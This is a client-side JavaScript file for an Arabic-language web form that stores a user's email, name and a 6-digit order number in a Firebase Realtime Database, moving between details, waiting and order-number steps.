import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
import { getDatabase, ref, set, push, update } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';

const firebaseConfig = {
    apiKey: "AIzaSyBwkfW26EAPTiupO6mRejVcKMbpJZV1ohE",
    authDomain: "shahame-98a21.firebaseapp.com",
    databaseURL: "https://shahame-98a21-default-rtdb.firebaseio.com",
    projectId: "shahame-98a21",
    storageBucket: "shahame-98a21.firebasestorage.app",
    messagingSenderId: "885951504437",
    appId: "1:885951504437:web:55b4d335c9418ba376517c"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

const requestForm = document.getElementById('requestForm');
const orderForm = document.getElementById('orderForm');
const waitingPanel = document.getElementById('waitingPanel');
const messageDiv = document.getElementById('message');
const submitButton = document.getElementById('submitButton');
const orderSubmitButton = document.getElementById('orderSubmitButton');
const backButton = document.getElementById('backButton');
const qrButton = document.getElementById('qrButton');
const orderNumberInput = document.getElementById('orderNumber');
const pageTitle = document.getElementById('pageTitle');

let currentEmail = '';
let currentName = '';
let currentRequestRef = null;

requestForm.addEventListener('submit', async (event) => {
    event.preventDefault();

    currentEmail = document.getElementById('email').value.trim();
    currentName = document.getElementById('name').value.trim();

    if (!currentEmail || !currentName) {
        showMessage('يرجى إدخال البريد الإلكتروني والاسم', 'error');
        return;
    }

    submitButton.disabled = true;
    submitButton.textContent = 'جاري الحفظ...';
    showStep('waiting');

    try {
        if (!currentRequestRef) {
            currentRequestRef = push(ref(database, 'requests'));
            await set(currentRequestRef, {
                email: currentEmail,
                name: currentName,
                orderNumber: '',
                status: 'pending',
                timestamp: Date.now(),
                date: new Date().toLocaleString('ar-EG')
            });
        } else {
            await update(currentRequestRef, {
                email: currentEmail,
                name: currentName,
                updatedAt: Date.now()
            });
        }

        setTimeout(() => {
            showStep('order');
        }, 3000);
    } catch (error) {
        showStep('details');
        showMessage('حدث خطأ أثناء حفظ البيانات. حاول مرة أخرى', 'error');
        console.error('Error:', error);
    } finally {
        submitButton.disabled = false;
        submitButton.textContent = 'تقديم طلب';
    }
});

orderForm.addEventListener('submit', async (event) => {
    event.preventDefault();

    const orderNumber = orderNumberInput.value.trim();

    if (!/^\d{6}$/.test(orderNumber)) {
        showMessage('يجب أن يكون رقم الطلب مكونا من 6 أرقام فقط', 'error');
        return;
    }

    orderSubmitButton.disabled = true;
    orderSubmitButton.textContent = 'جاري الإرسال...';

    try {
        if (!currentRequestRef) {
            currentRequestRef = push(ref(database, 'requests'));
            await set(currentRequestRef, {
                email: currentEmail,
                name: currentName,
                orderNumber,
                status: 'pending',
                timestamp: Date.now(),
                date: new Date().toLocaleString('ar-EG'),
                orderNumberUpdatedAt: Date.now()
            });
        } else {
            await update(currentRequestRef, {
                orderNumber,
                orderNumberUpdatedAt: Date.now()
            });
        }

        requestForm.reset();
        orderForm.reset();
        currentRequestRef = null;
        showStep('details');
        showMessage(`تم إرسال الطلب بنجاح. رقم الطلب: ${orderNumber}`, 'success');
    } catch (error) {
        showMessage('حدث خطأ أثناء إرسال الطلب. حاول مرة أخرى', 'error');
        console.error('Error:', error);
    } finally {
        orderSubmitButton.disabled = false;
        orderSubmitButton.textContent = 'إرسال الطلب';
    }
});

qrButton.addEventListener('click', () => {
    showMessage('زر المسح غير مفعل حاليا. يمكنك تقديم الطلب من النموذج.', 'error');
});

orderNumberInput.addEventListener('input', (event) => {
    event.target.value = event.target.value.replace(/\D/g, '');
});

backButton.addEventListener('click', () => {
    showStep('details');
});

function showMessage(text, type) {
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.classList.remove('hidden');
}

function showStep(step) {
    const isOrderStep = step === 'order';
    const isWaitingStep = step === 'waiting';

    requestForm.classList.toggle('hidden', isOrderStep || isWaitingStep);
    orderForm.classList.toggle('hidden', !isOrderStep);
    waitingPanel.classList.toggle('hidden', !isWaitingStep);
    pageTitle.textContent = isOrderStep ? 'رقم الطلب' : isWaitingStep ? 'يرجى الانتظار' : 'تقديم طلب';
    messageDiv.classList.add('hidden');

    if (isOrderStep) {
        orderNumberInput.focus();
    }
}
